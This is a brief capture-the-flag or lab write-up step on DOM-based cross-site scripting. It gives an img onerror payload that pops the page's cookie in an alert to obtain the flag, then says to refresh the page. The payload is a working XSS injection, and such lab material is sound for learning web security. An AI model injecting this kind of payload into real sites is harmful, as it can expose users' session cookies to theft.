# [DOM XSS](DOM%20XSS.md)
### To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

```html
<img src="" onerror=alert(document.cookie)>
```
Then `refresh` the page
![](Screenshot%202026-06-26%20at%2012.30.44.png)